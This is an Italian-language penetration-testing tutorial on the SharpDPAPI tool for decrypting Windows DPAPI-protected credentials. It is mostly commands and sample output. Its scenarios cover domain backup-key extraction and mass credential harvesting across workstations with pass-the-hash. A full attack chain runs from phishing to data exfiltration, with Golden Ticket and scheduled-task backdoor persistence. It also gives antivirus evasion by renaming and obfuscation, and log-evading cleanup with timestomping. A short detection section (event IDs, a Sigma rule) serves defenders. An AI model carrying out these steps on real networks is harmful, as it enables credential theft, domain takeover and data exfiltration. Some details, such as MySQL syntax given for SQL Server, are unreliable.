---
title: 'SharpDPAPI: Abuso di DPAPI per Decrypt Credenziali su Windows'
slug: sharpdpapi
description: SharpDPAPI permette di estrarre e decriptare credenziali protette da DPAPI su Windows. Tool avanzato per credential access e lateral movement.
image: /Gemini_Generated_Image_xaa08qxaa08qxaa0.webp
draft: true
date: 2026-02-25T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - dpapi
---

SharpDPAPI è il tool definitivo in C# per decryption di credential protetti da Windows DPAPI (Data Protection API). Quando ottieni accesso Domain Admin o credential di un utente specifico durante un pentest Active Directory, SharpDPAPI decripta browser passwords, RDP saved connections, wireless profiles, certificates e ogni dato protetto da DPAPI su qualsiasi workstation del dominio.

Sviluppato da @harmj0y, @leechristensen e @djhohnstein del team GhostPack/SpecterOps, SharpDPAPI implementa la logica DPAPI completa in C# puro, abilitando decryption con domain backup key (persiste per tutta la vita del dominio), user password, NTLM hash, o masterkey GUID mappings. Il vantaggio critico: il domain backup key non cambia mai dopo domain creation - estratto una volta, decripta credential di qualsiasi utente indefinitamente.

In questa guida impari a usare SharpDPAPI in scenari reali: da extraction domain backup key a mass triage di workstation, da browser credential decryption a RDP password harvesting. SharpDPAPI si posiziona nella kill chain post-domain compromise, alimentando [lateral movement](https://hackita.it/articoli/impacket) e cloud account access con cleartext password invece di hash.

## Setup e Installazione

### Requisiti Tecnici

**Sistema operativo:** Windows 7/8/10/11, Server 2012-2022 (execution); Linux (via Mono se necessario)\
**Build requirements:** .NET Framework 3.5+, Visual Studio 2015+, MSBuild\
**Runtime:** .NET Framework 3.5+ sul target Windows\
**Repository ufficiale:** [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)\
**Versione attuale:** v1.20.0 (costantemente aggiornato)

**Dipendenze:** Nessuna (standalone .NET assembly)

### Compilazione da Source

```bash
# Clone repository
git clone https://github.com/GhostPack/SharpDPAPI.git
cd SharpDPAPI

# Apri SharpDPAPI.sln in Visual Studio
# Build → Release (Any CPU)

# Output: SharpDPAPI\bin\Release\SharpDPAPI.exe
```

**Dimensione:** \~180 KB (C# managed assembly)

### Download Pre-compilato

```bash
# Da releases GitHub
wget https://github.com/GhostPack/SharpDPAPI/releases/download/v1.20.0/SharpDPAPI.exe
```

**Detection:** \~15/70 su VirusTotal (molto meno di [LaZagne](https://hackita.it/articoli/lazagne))

### Verifica Funzionamento

```cmd
C:\Temp>SharpDPAPI.exe

SharpDPAPI 1.20.0

Usage:
    backupkey /server:DC01.corp.local
    masterkeys /pvk:key.pvk
    credentials /pvk:key.pvk
    vaults /pvk:key.pvk
    triage /pvk:key.pvk
```

Se vedi menu help → installazione corretta.

## Uso Base

### Domain Backup Key Extraction

**Prerequisito:** Domain Admin privileges

**Comando:**

```cmd
SharpDPAPI.exe backupkey /server:DC01.corp.local /file:backup.pvk
```

**Output:**

```
[*] Using DRSR to get DPAPI backup key for CORP.LOCAL

[*] DPAPI backup key pulled from DC01.corp.local:

  <RSAKeyValue>
    <Modulus>xKq3Vf3b4gP8yN...</Modulus>
    <Exponent>AQAB</Exponent>
    <P>7kM2p...</P>
    <Q>0rV8n...</Q>
    <DP>6g5Fx...</DP>
    <DQ>xH3Kz...</DQ>
    <InverseQ>5nW2r...</InverseQ>
    <D>lB7Zt...</D>
  </RSAKeyValue>

[*] Backup key written to: backup.pvk
```

**Criticità:** Questo backup key **non cambia mai**. Una volta estratto, valido indefinitamente per decryptare masterkey di qualsiasi utente nel dominio.

### Masterkeys Enumeration Locale

```cmd
# Enumera masterkeys utente corrente
SharpDPAPI.exe masterkeys

[*] Triaging masterkeys for current user

[*] Found MasterKey {A1B2C3D4-E5F6-1234-5678-90ABCDEF1234}
    [*] guidMasterKey: {A1B2C3D4-E5F6-1234-5678-90ABCDEF1234}
    [*] size: 468
    [*] flags: 0
    [*] dwMasterKeyLen: 256
    [*] dwBackupKeyLen: 144
    [*] dwCredHistLen: 0
    [*] dwDomainKeyLen: 188
```

### Credentials Triage con Backup Key

```cmd
# Triage credential manager
SharpDPAPI.exe credentials /pvk:backup.pvk

[*] Triaging Credentials for CORP\john

Folder: C:\Users\john\AppData\Local\Microsoft\Credentials\

[CREDENTIAL] 
  CredentialBlob     : Password123ForInternalTool
  TargetName         : Domain:target=https://internal-tool.corp.local
  UserName           : john@corp.local
  LastWritten        : 2/4/2026 10:23:45 AM

[CREDENTIAL]
  CredentialBlob     : AdminPasswordRDP!
  TargetName         : Domain:target=TERMSRV/192.168.1.50
  UserName           : CORP\administrator
  LastWritten        : 1/15/2026 3:12:18 PM
```

**Valore:** RDP saved password Domain Admin → direct access server.

### Browser Passwords (vedi SharpChrome)

**Nota:** Per Chrome/Edge, usa il tool companion [SharpChrome](https://hackita.it/articoli/sharpchrome):

```cmd
SharpChrome.exe logins /pvk:backup.pvk
```

Vedremo dettagli in articolo dedicato SharpChrome.

## Tecniche Operative

### Scenario 1: Domain Backup Key Extraction e Mass Triage

**Contesto:** Compromesso Domain Admin, vuoi credential da tutte le workstation.

**Fase 1: Extract Backup Key (T+0)**

```cmd
# Da qualsiasi macchina domain-joined con DA creds
SharpDPAPI.exe backupkey /server:DC01.corp.local /file:C:\backup.pvk

[*] Backup key written to: C:\backup.pvk
```

**Fase 2: Copy Backup Key su Attacker**

```bash
# Download via SMB
smbclient.py //target/C$ -c 'get backup.pvk'
```

**Fase 3: Triage Workstation #1 (T+2min)**

```cmd
SharpDPAPI.exe triage /pvk:backup.pvk /server:WKSTN01.corp.local

[*] Triaging WKSTN01.corp.local for CORP\user01

[CREDENTIAL MANAGER]
  CredentialBlob: GitHubPersonalToken123
  TargetName: git:https://github.com
  
[RDG]
  Hostname: prod-db.corp.local
  Username: dbadmin
  Password: DbAdm1nPa$$
```

**Fase 4: Triage Multi-Host (T+10min)**

```bash
# NetExec con SharpDPAPI module (se disponibile)
# Oppure: script custom

for host in $(cat workstations.txt); do
  psexec.py CORP/admin@$host "C:\Temp\SharpDPAPI.exe triage /pvk:backup.pvk > C:\output.txt"
  smbclient.py //$ host/C$ -c 'get output.txt' > loot/$host.txt
done
```

**Risultato:** 200 workstation = 500+ unique credentials in 30 minuti.

### Scenario 2: RDP Password Harvesting

**Obiettivo:** Trovare saved RDP connections verso server production.

```cmd
SharpDPAPI.exe rdg /pvk:backup.pvk

[*] Triaging RDCMan.settings files for all users

[RDG - User: CORP\admin]
  File: C:\Users\admin\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
  
  [SERVER ENTRY]
    Hostname: DC01.corp.local
    Username: Administrator
    Password: DomainAdm1n2024!
    
  [SERVER ENTRY]
    Hostname: 192.168.1.100
    Username: root
    Password: R00tServerPa$$
```

**Integration:** Password → [Evil-WinRM](https://hackita.it/articoli/evil-winrm) o RDP diretto

```bash
# RDP verso DC
xfreerdp /v:DC01.corp.local /u:Administrator /p:'DomainAdm1n2024!' /cert-ignore
```

### Scenario 3: Certificate Private Key Extraction

**Contesto:** Utente ha certificate per VPN o code signing.

```cmd
SharpDPAPI.exe certificates /pvk:backup.pvk /machine

[*] Triaging Certificates for all users

[CERTIFICATE]
  Issuer: CN=Company-CA, DC=corp, DC=local
  Subject: CN=John Doe, OU=IT, O=Company
  Thumbprint: A1B2C3D4E5F6...
  KeyUsage: Digital Signature, Key Encipherment
  
  [PRIVATE KEY]
    RSAKeyValue: <RSAKeyValue><Modulus>xK...</Modulus>...
```

**Uso:** Export certificate + private key → impersonate utente per VPN, firma codice, etc.

### Scenario 4: User Password → Masterkeys (Offline)

**Contesto:** Hai Windows password utente, vuoi decryptare masterkeys offline.

```cmd
# Con password
SharpDPAPI.exe masterkeys /password:UserWindowsPassword123

[*] Found MasterKey {GUID}
  [*] Successfully decrypted masterkey with password!
  [*] key       : 0x1a2b3c4d5e6f...
  [*] sha1(key) : a1b2c3d4e5f6a7b8c9d0...
```

**Alternative con NTLM hash:**

```cmd
SharpDPAPI.exe masterkeys /ntlm:32693b11e6aa90eb43d32c72a07ceea6
```

**Integration post-masterkey:**

```cmd
# Usa masterkey decryptato per credential
SharpDPAPI.exe credentials /mkfile:decrypted_keys.txt
```

## Tecniche Avanzate

### DPAPI Blob Decryption Custom

**Scenario:** Hai blob DPAPI custom di applicazione proprietaria.

```cmd
# Decrypt arbitrary DPAPI blob
SharpDPAPI.exe blob /target:C:\path\to\encrypted.blob /pvk:backup.pvk

[*] Decrypting DPAPI blob: encrypted.blob
[*] Blob decrypted successfully:

  Cleartext Data: SuperSecretApplicationPassword!
```

### Machine Masterkeys (SYSTEM context)

**Differenza:** User masterkeys vs Machine masterkeys (SYSTEM account).

```cmd
# Machine masterkeys (per scheduled task credentials, service accounts)
SharpDPAPI.exe machinemasterkeys /pvk:backup.pvk

[*] Triaging machine masterkeys

[*] Found MasterKey (SYSTEM) {GUID}
  [*] Successfully decrypted with backup key
```

**Uso:** Scheduled task che girano come SYSTEM ma salvano credentials di altri account.

### Machinecredentials Triage

```cmd
SharpDPAPI.exe machinecredentials /pvk:backup.pvk

[*] Triaging machine credentials

[CREDENTIAL - SYSTEM]
  TargetName: Domain:batch=TaskScheduler:Task:{GUID}
  UserName: CORP\service_account
  Password: S3rv1c3P@$$w0rd
```

**Critical:** Service account password → potential DA path via abusable service.

### KeePass ProtectedUserKey Decryption

**Scenario:** KeePass database protetto con Windows password (non master password).

```cmd
SharpDPAPI.exe keepass /pvk:backup.pvk

[*] Triaging KeePass ProtectedUserKey.bin files

[*] Found: C:\Users\admin\AppData\Roaming\KeePass\ProtectedUserKey.bin
  [*] Decrypted ProtectedUserKey: A1B2C3D4E5F6...

[*] Use this key with KeePass database decryption tools
```

**Limitation:** Questo decripta il "container" Windows, ma se KeePass database ha anche master password, richiede crack separato.

### Wireless Profile Password Extraction

```cmd
SharpDPAPI.exe wifi /pvk:backup.pvk

[*] Triaging WiFi profiles

[WIFI PROFILE]
  SSID: Company_Corporate
  Authentication: WPA2-Enterprise
  (802.1X - no PSK)

[WIFI PROFILE]
  SSID: Company_Guest
  Authentication: WPA2-PSK
  Password: GuestWiFiPass2024!
```

### Remote Triage via SMB

```cmd
# Triage remote workstation senza eseguire codice sul target
SharpDPAPI.exe triage /pvk:backup.pvk /target:C:\Users\john /server:WKSTN05.corp.local

# Accede remote shares \\WKSTN05\C$\Users\john\AppData\...
```

**Vantaggio:** No code execution su target, solo file access via SMB (stealthier).

## Scenari Pratici di Pentest

### Scenario A: Domain Admin → Full Credential Harvest

**Timeline:** 1 ora (100 workstation)

**Fase 1: Initial DA Access (T+0)**

```bash
# Da [SafetyKatz](https://hackita.it/articoli/safetykatz) su workstation compromessa
# NTLM hash: 32693b11e6aa90eb43d32c72a07ceea6

# Pass-the-hash to DC
secretsdump.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin@DC01.corp.local
```

**Fase 2: Extract Domain Backup Key (T+5min)**

```cmd
# RDP to DC or remote execute
evil-winrm -i DC01.corp.local -u domainadmin -H 32693b11e6aa90eb43d32c72a07ceea6

*Evil-WinRM* PS> C:\Temp\SharpDPAPI.exe backupkey /server:DC01.corp.local /file:C:\backup.pvk

# Download backup.pvk su attacker machine
```

**Fase 3: Deploy SharpDPAPI + PVK su Workstations (T+10min)**

```bash
# Copy to SYSVOL for easy access
smbclient.py //DC01.corp.local/SYSVOL
# smb> put SharpDPAPI.exe CORP.LOCAL\scripts\
# smb> put backup.pvk CORP.LOCAL\scripts\
```

**Fase 4: Mass Execution (T+15min)**

```bash
# NetExec parallel
nxc smb targets.txt -u domainadmin -H 32693b11e6aa90eb43d32c72a07ceea6 \
  -x "\\DC01\SYSVOL\corp.local\scripts\SharpDPAPI.exe triage /pvk:\\DC01\SYSVOL\corp.local\scripts\backup.pvk > C:\output.txt" \
  --threads 20
```

**Fase 5: Collection (T+45min)**

```bash
# Download all outputs
while read host; do
  smbclient.py //$ host/C$ -c 'get output.txt' > loot/$host.txt
done < targets.txt
```

**Fase 6: Parsing (T+1h)**

```bash
# Extract all cleartext credentials
grep -r "CredentialBlob\|Password" loot/ | sort -u > all_passwords.txt

# Deduplica
cat all_passwords.txt | awk '{print $NF}' | sort -u > unique_passwords.txt
```

**Risultato:** 300-800 unique cleartext passwords da 100 workstation.

### Scenario B: Credential Flow Browser → Cloud

**Obiettivo:** Da DPAPI browser credentials a AWS console access.

**Fase 1: Browser Password Extraction**

```cmd
# Con backup key già estratto
SharpChrome.exe logins /pvk:backup.pvk /server:WKSTN10.corp.local

[Chrome - User: CORP\developer]
  URL: https://console.aws.amazon.com
  Username: dev-admin@company.com
  Password: AwsConsole2024!
```

**Fase 2: AWS Console Access**

```bash
# Login AWS
# Username: dev-admin@company.com
# Password: AwsConsole2024!
```

**Fase 3: AWS CLI Keys Extraction**

```bash
# Una volta in console, create CLI access keys
aws configure
# Output credentials in ~/.aws/credentials
```

**Fase 4: Enumeration & Exfiltration**

```bash
# List S3 buckets
aws s3 ls

# Download sensitive data
aws s3 sync s3://company-backups/ ./backups/
```

**Timeline totale:** 15 minuti da DPAPI a cloud data exfiltration.

### Scenario C: Offline DPAPI Decryption

**Contesto:** Hai dump completo di `C:\Users\` directory da workstation, vuoi decrypt offline.

**Fase 1: Collect DPAPI Files**

```bash
# Download user profile directory
smbclient.py //target/C$ -c 'prompt OFF; recurse ON; cd Users\john; mget *'

# Files interessanti:
# AppData/Local/Microsoft/Credentials/*
# AppData/Roaming/Microsoft/Credentials/*
# AppData/Local/Microsoft/Protect/{SID}/*
```

**Fase 2: Decrypt con Backup Key**

```cmd
# Su attacker Windows VM
SharpDPAPI.exe credentials /pvk:backup.pvk /target:C:\loot\Users\john

[*] Triaging credentials for offline directory

[CREDENTIAL]
  CredentialBlob: OfflinePassword123
  TargetName: LegacyConnectorSystem:name=legacy-app
```

**Vantaggio:** No code execution su target, tutto offline su attacker machine.

## Toolchain Integration

### Credential Flow Architecture

```
[Domain Admin Access]
    ↓
SharpDPAPI.exe backupkey
    ↓ (backup.pvk - persiste indefinitamente)
SharpDPAPI.exe triage / SharpChrome.exe
    ↓ (cleartext passwords)
[Evil-WinRM](https://hackita.it/articoli/evil-winrm) / RDP / SSH
    ↓ (interactive access)
[Mimikatz](https://hackita.it/articoli/mimikatz) / [SafetyKatz](https://hackita.it/articoli/safetykatz)
    ↓ (extract more credentials)
Repeat on new systems
```

### Passaggio Dati Concreto

**Step 1: SharpDPAPI → RDP Password**

```
[RDG]
  Hostname: prod-sql.corp.local
  Username: sa_account
  Password: SqlAdm1nP@$$
```

**Step 2: RDP Password → Database Access**

```bash
# RDP to SQL server
xfreerdp /v:prod-sql.corp.local /u:sa_account /p:'SqlAdm1nP@$$'
```

**Step 3: Database → Data Exfiltration**

```sql
-- Connect to SQL Server Management Studio
-- Dump customer database
SELECT * FROM customers INTO OUTFILE '/tmp/customers.csv';
```

### Tabella Comparativa Alternative

| Tool                                                   | Language | DPAPI Method           | Chrome Support    | Domain Backup Key | Manutenzione  |
| ------------------------------------------------------ | -------- | ---------------------- | ----------------- | ----------------- | ------------- |
| SharpDPAPI                                             | C#       | Native                 | Via SharpChrome   | Yes               | Attivo (2025) |
| [SharpChrome](https://hackita.it/articoli/sharpchrome) | C#       | Native                 | Native            | Yes               | Attivo        |
| [LaZagne](https://hackita.it/articoli/lazagne)         | Python   | CryptUnprotectData API | Yes               | No                | Attivo        |
| Mimikatz                                               | C/C++    | Native                 | Via dpapi::chrome | Yes               | Attivo        |
| DonPAPI                                                | Python   | Impacket-based         | Yes               | Yes               | Attivo        |
| dploot                                                 | Python   | Impacket-based         | Yes               | Yes               | Attivo (2024) |

**Quando usare SharpDPAPI:**

* Hai Domain Admin access (backup key extraction)
* Need mass triage (100+ workstation)
* C# execution (Cobalt Strike execute-assembly)
* Comprehensive DPAPI coverage (non solo browser)

**Quando usare alternative:**

* **LaZagne:** Quick single-host, Python available
* **SharpChrome:** Chrome-only targeted
* **DonPAPI/dploot:** Remote Linux attacker, Python ecosystem
* **Mimikatz:** Already using Mimikatz, DPAPI è un modulo aggiuntivo

## Attack Chain Completa

**Scenario:** Pentest mid-size company, 300 dipendenti, 250 workstation.

### Fase 1: Reconnaissance (T+0, 6 ore)

```bash
# Passive OSINT
amass enum -passive -d company.com

# Active enumeration (da workstation compromessa)
SharpHound.exe -c All --zipfilename company_bh.zip
# Import in BloodHound
```

### Fase 2: Initial Access (T+6h, 2 ore)

```bash
# Phishing → meterpreter session
[+] Meterpreter session 1 opened

meterpreter> sysinfo
Computer: WKSTN042.corp.local
OS: Windows 10
Meterpreter: x64/windows
```

### Fase 3: Privilege Escalation (T+8h, 30min)

```
meterpreter> getsystem
# Exploit: PrintNightmare

meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```

### Fase 4: Domain Reconnaissance (T+8h30min, 15min)

```
# Upload SharpHound
meterpreter> upload SharpHound.exe C:\\Temp\\

# Execute
meterpreter> execute -f C:\\Temp\\SharpHound.exe

# Download ZIP
meterpreter> download C:\\Temp\\*_BloodHound.zip
```

### Fase 5: Credential Harvesting (T+8h45min, 10min)

```
# Upload SafetyKatz
meterpreter> upload SafetyKatz.exe C:\\Temp\\

# Execute
meterpreter> execute -f C:\\Temp\\SafetyKatz.exe -H

# Output: Domain Admin NTLM hash
# 32693b11e6aa90eb43d32c72a07ceea6
```

### Fase 6: Domain Admin Escalation (T+9h, 5min)

```bash
# Pass-the-hash to DC
evil-winrm -i DC01.corp.local -u domainadmin -H 32693b11e6aa90eb43d32c72a07ceea6

*Evil-WinRM* PS> whoami
corp\domainadmin
```

### Fase 7: DPAPI Backup Key Extraction (T+9h5min, 2min)

```
*Evil-WinRM* PS> C:\Temp\SharpDPAPI.exe backupkey /server:DC01.corp.local /file:C:\backup.pvk

[*] Backup key written to: C:\backup.pvk
```

### Fase 8: Mass Credential Harvesting (T+9h10min, 1 ora)

```bash
# Deploy SharpDPAPI + backup.pvk to SYSVOL
# NetExec mass execution su 250 workstation

nxc smb targets.txt -u domainadmin -H hash \
  -x "\\DC01\SYSVOL\SharpDPAPI.exe triage /pvk:\\DC01\SYSVOL\backup.pvk" \
  --threads 50

# Collect outputs
# Result: 600+ credentials extracted
```

### Fase 9: Persistence (T+10h10min, 20min)

```
# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:... /ptt

# Scheduled task backdoor
schtasks /create /tn WindowsUpdate /tr C:\backdoor.exe /sc onlogon /ru SYSTEM /s DC01
```

### Fase 10: Exfiltration (T+10h30min, variabile)

```bash
# Database dumps
# File server data
# Email archives
# Total: 500 GB exfiltrated
```

**Timeline totale:** \~11 ore da recon a full domain compromise con mass credential harvesting.

**Pivot critico:** Domain Admin → DPAPI backup key → 600 credentials → lateral movement illimitato.

## Detection & Evasion

### Blue Team Detection

**Domain Backup Key Extraction:**

**Event ID 4662 - Active Directory Privileged Operation:**

```xml
<EventID>4662</EventID>
<ObjectName>CN=BCKUPKEY Secret,CN=System,DC=corp,DC=local</ObjectName>
<AccessMask>0x2</AccessMask>
<Properties>{e3514235-4b06-11d1-ab04-00c04fc2dcd2}</Properties>
```

**Critical:** Questo event indica DRSR replication richiesta per DPAPI backup key - alert massima priorità.

**File Access Patterns:**

```
Process: SharpDPAPI.exe
  → File Read: C:\Users\*\AppData\Local\Microsoft\Credentials\*
  → File Read: C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
  → File Read: C:\Users\*\AppData\Local\Microsoft\Protect\*\*
  → Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\*
```

**Sysmon Event 11 - FileCreate/Access:**

```xml
<EventID>11</EventID>
<Image>C:\Temp\SharpDPAPI.exe</Image>
<TargetFilename>C:\Users\john\AppData\Local\Microsoft\Credentials\DFBE...</TargetFilename>
```

**Network Detection:**

```
# RPC calls to DC for DRSR replication (backup key extraction)
Source: Workstation
Destination: DC01.corp.local:135 (RPC Endpoint Mapper)
Protocol: MS-DRSR (Directory Replication Service Remote Protocol)
```

**Sigma Rule:**

```yaml
title: SharpDPAPI Execution
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\SharpDPAPI.exe'
    CommandLine|contains:
      - 'backupkey'
      - 'masterkeys'
      - 'credentials'
      - '/pvk:'
  condition: selection
```

### Tecniche di Evasion

#### 1. Obfuscation e Renaming

```bash
# Rename assembly
cp SharpDPAPI.exe SystemDiagnostics.exe

# Confuser obfuscation (commercial tool)
ConfuserEx-CLI.exe -n SharpDPAPI.exe -o SystemDiagnostics.exe
```

**Detection rate:** 15/70 → \~5/70 con obfuscation.

#### 2. In-Memory Execution (Cobalt Strike)

```
beacon> execute-assembly /opt/SharpDPAPI.exe backupkey /server:DC01.corp.local

# No file drop su disco
# Execution direttamente in beacon process memory
```

**Evasion:** Nessun file artifact, riduce Sysmon Event 1/11 detection.

#### 3. Remote File Access invece di Code Execution

```cmd
# Invece di eseguire SharpDPAPI su target
# Accedi file via SMB e decripta offline

# Map remote C$ drive
net use Z: \\target\C$ /user:CORP\admin

# Copy credential files
xcopy Z:\Users\john\AppData\Local\Microsoft\Credentials C:\loot\ /s

# Disconnect
net use Z: /delete

# Decrypt offline su attacker machine
SharpDPAPI.exe credentials /pvk:backup.pvk /target:C:\loot
```

**Evasion:** No code execution event su target, solo file access (molto meno suspicious).

#### 4. Staged Backup Key Extraction

**Problema:** Event 4662 triggera SIEM alert su backup key access.

**Mitigation:** Non esistono bypass reali per questo event - è critico by design.

**Alternative:**

* Extract durante maintenance window (meno suspicious)
* Blend in con legit DC replication traffic (timing)
* Extract una sola volta, poi riusa backup key indefinitamente

### Cleanup Post-Exploitation

```cmd
# Delete SharpDPAPI executable
del C:\Temp\SharpDPAPI.exe

# Delete backup key file
del C:\backup.pvk

# Delete output files
del C:\output.txt

# Clear file access evidence (difficult)
# File access events già in logs, impossibile rimuovere senza log tampering

# Timestomp (se necessario)
# Use timestomp.exe per restore original timestamps su file modificati
```

**Attenzione:** DPAPI backup key extraction (Event 4662) è logged su DC, non su workstation - rimozione richiede DC access e è altamente detectable.

## Performance & Scaling

### Single Target Performance

**Backup key extraction:** 2-5 secondi (network latency a DC)

**Masterkeys enumeration:** \<1 secondo

**Credentials triage:** 2-5 secondi (dipende da numero di credential blobs)

**Vault triage:** 1-3 secondi

**RDG files:** 1-2 secondi

**Certificates:** 3-8 secondi (parsing ASN.1)

### Multi-Target Scaling

```bash
# Sequential (50 host)
# 50 * 5 sec = 250 sec = 4.2 min

# Parallel (10 thread)
# 50 / 10 * 5 sec = 25 sec

# NetExec parallel execution
nxc smb targets.txt -u admin -p pass -M sharpdpapi --threads 20
# 50 host in ~15 secondi
```

**Bottleneck:** Network file access via SMB, non computation.

### Resource Usage

**Memory:** \~30-50 MB per SharpDPAPI.exe process

**CPU:** Minimal (\<5% single core)

**Network:** SMB traffic \~1-5 MB per host (credential files download)

**Disk I/O:** Minimal (read-only access)

### Comparison Performance

| Operation          | SharpDPAPI           | LaZagne | Mimikatz dpapi | Manual |
| ------------------ | -------------------- | ------- | -------------- | ------ |
| Backup key extract | 3s                   | N/A     | 3s             | N/A    |
| Single host triage | 5s                   | 10s     | 8s             | 30min  |
| 50 host (parallel) | 15s                  | 300s    | 400s           | Hours  |
| Chrome passwords   | Via SharpChrome (1s) | 2s      | 5s             | 10min  |

## Tabelle Tecniche

### Command Reference

| Comando                           | Funzione                           | Privilegi Richiesti |
| --------------------------------- | ---------------------------------- | ------------------- |
| `backupkey /server:DC01`          | Extract domain DPAPI backup key    | Domain Admin        |
| `masterkeys`                      | Enumerate current user masterkeys  | Standard user       |
| `masterkeys /pvk:key.pvk`         | Decrypt masterkeys with backup key | Standard user       |
| `credentials /pvk:key.pvk`        | Decrypt Credential Manager blobs   | Standard user       |
| `vaults /pvk:key.pvk`             | Decrypt IE/Edge Vault credentials  | Standard user       |
| `rdg /pvk:key.pvk`                | Decrypt RDCMan saved connections   | Standard user       |
| `triage /pvk:key.pvk`             | Decrypt ALL credential types       | Standard user       |
| `certificates /pvk:key.pvk`       | Extract certificate private keys   | Standard user       |
| `blob /target:file /pvk:key.pvk`  | Decrypt arbitrary DPAPI blob       | Standard user       |
| `machinemasterkeys /pvk:key.pvk`  | Decrypt SYSTEM masterkeys          | Administrator       |
| `machinecredentials /pvk:key.pvk` | Decrypt SYSTEM credentials         | Administrator       |

### DPAPI Protected Data Types

| Type               | Location                                                                         | Sensitivity | Decrypt Method                    |
| ------------------ | -------------------------------------------------------------------------------- | ----------- | --------------------------------- |
| Credential Manager | `%LOCALAPPDATA%\Microsoft\Credentials`                                           | High        | `/credentials`                    |
| Windows Vault      | `%APPDATA%\Microsoft\Vault`                                                      | High        | `/vaults`                         |
| RDCMan             | `RDCMan.settings` file                                                           | Critical    | `/rdg`                            |
| Chrome passwords   | Via SharpChrome                                                                  | High        | SharpChrome                       |
| Certificate keys   | `%APPDATA%\Microsoft\Crypto`                                                     | Critical    | `/certificates`                   |
| WiFi PSK           | Windows API                                                                      | Medium      | `/wifi` (non standard SharpDPAPI) |
| Scheduled Task     | `%SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials` | High        | `/machinecredentials`             |

### Detection Methods

| Method        | Indicator                      | Reliability | Severity |
| ------------- | ------------------------------ | ----------- | -------- |
| Event 4662    | DPAPI backup key access        | Very High   | Critical |
| Sysmon 11     | Credential file access         | High        | High     |
| Sysmon 1      | SharpDPAPI.exe process         | Medium      | Medium   |
| Network - RPC | DRSR calls to DC               | High        | Critical |
| Behavioral    | Sequential file access pattern | High        | High     |

## Troubleshooting

### Errore: "Unable to retrieve DPAPI backup key"

**Causa:** Privilegi insufficienti (non Domain Admin).

**Verifica:**

```cmd
whoami /groups | findstr "S-1-5-21-.*-512"
# Se non presente → non Domain Admin
```

**Fix:**

```cmd
# Ottieni Domain Admin credentials
# Oppure: DCSync per extract DPAPI backup key indirettamente
mimikatz# lsadump::dcsync /domain:corp.local /guid:{backup-key-guid}
```

### Errore: "Masterkey not found"

**Causa:** Masterkey per credential blob non presente in user profile.

**Verifica:**

```cmd
dir /s %APPDATA%\Microsoft\Protect
# Verifica GUID masterkey presente
```

**Fix:**

```cmd
# Se masterkey mancante, credential non decryptabile
# Alternative: cerca backup masterkey in altri location
# Oppure: target altri utenti con masterkeys disponibili
```

### Backup Key Decryption Failed

**Causa:** Backup key PVK file corrotto o errato.

**Verifica:**

```cmd
# Re-extract backup key
SharpDPAPI.exe backupkey /server:DC01.corp.local /file:backup_new.pvk

# Confronta con vecchio
fc /b backup.pvk backup_new.pvk
```

**Fix:** Usa backup key appena estratto.

### Remote Triage Failed (Access Denied)

**Causa:** SMB share access negato.

**Verifica:**

```cmd
net use \\target\C$ /user:CORP\admin
# Se fallisce → verifica credentials
```

**Fix:**

```cmd
# Assicurati di avere admin access al target
# Oppure: esegui SharpDPAPI localmente sul target invece di remote
psexec \\target -u CORP\admin SharpDPAPI.exe triage /pvk:backup.pvk
```

### Chrome Passwords Empty

**Causa:** Chrome v80+ richiede SharpChrome dedicato, non SharpDPAPI credentials.

**Fix:**

```cmd
# Use SharpChrome invece
SharpChrome.exe logins /pvk:backup.pvk
```

Vedi [SharpChrome](https://hackita.it/articoli/sharpchrome) per dettagli.

## FAQ

**Il DPAPI backup key cambia mai?**

No. Una volta creato durante domain setup, il DPAPI backup key rimane invariato per tutta la vita del dominio. Solo forest migration o domain rebuild lo cambiano. Questo rende extraction una singola operazione permanente.

**Posso usare SharpDPAPI senza Domain Admin?**

Sì, ma con limitazioni. Senza DA, puoi:

* Decrypt masterkeys con user password/NTLM hash
* Decrypt credential dell'utente corrente
* Target altri utenti se hai loro password/hash

NON puoi:

* Estrarre domain backup key (richiede DA)
* Mass triage di tutti gli utenti senza loro credentials

**Differenza tra SharpDPAPI e Mimikatz dpapi module?**

**SharpDPAPI:** C# puro, execute-assembly friendly, comprehensive coverage, attivamente manutenuto.

**Mimikatz dpapi:** C/C++, parte di tool più grande, coverage simile, comando syntax diverso.

Entrambi fanno stessa cosa, SharpDPAPI preferito per Cobalt Strike integration.

**SharpDPAPI funziona su Linux?**

Tecnicamente sì via Mono, ma performance degradate. Uso principale: Windows target, execution da attacker Windows VM o via Cobalt Strike beacon Windows.

**Come proteggo contro SharpDPAPI attack?**

**Difese:**

1. Monitor Event 4662 (DPAPI backup key access) - alert critico
2. Restrict DRSR replication permissions (solo DC-to-DC)
3. Implement Credential Guard (limita DPAPI attack surface)
4. Monitor file access patterns su `%APPDATA%\Microsoft\Credentials`
5. Use hardware-backed credential storage (TPM, SmartCard)

**Realtà:** Se attacker è DA, game over. Focus su preventing DA compromise, non su blocking post-compromise actions.

**SharpDPAPI vs DonPAPI/dploot difference?**

**SharpDPAPI:** C#, Windows execution, execute-assembly

**DonPAPI/dploot:** Python, Linux execution via Impacket, remote SMB access

Usa DonPAPI se attacker machine è Linux. Usa SharpDPAPI se hai beacon Windows o execute-assembly capability.

**Posso decrypt Chrome passwords da altro computer?**

Sì, con backup key:

1. Copy Chrome `Login Data` file + `Local State` da target
2. Copy DPAPI masterkey files
3. Decrypt offline con SharpChrome: `SharpChrome.exe logins /pvk:backup.pvk /target:C:\loot`

Offline decryption fully supported.

## Cheat Sheet Finale

| Scenario                 | Comando                                                     | Note                    |
| ------------------------ | ----------------------------------------------------------- | ----------------------- |
| **Extract backup key**   | `backupkey /server:DC01 /file:key.pvk`                      | Requires DA             |
| **List masterkeys**      | `masterkeys`                                                | Current user            |
| **Decrypt masterkeys**   | `masterkeys /pvk:key.pvk`                                   | With backup key         |
| **Credential Manager**   | `credentials /pvk:key.pvk`                                  | Cleartext passwords     |
| **IE/Edge Vault**        | `vaults /pvk:key.pvk`                                       | Browser saved passwords |
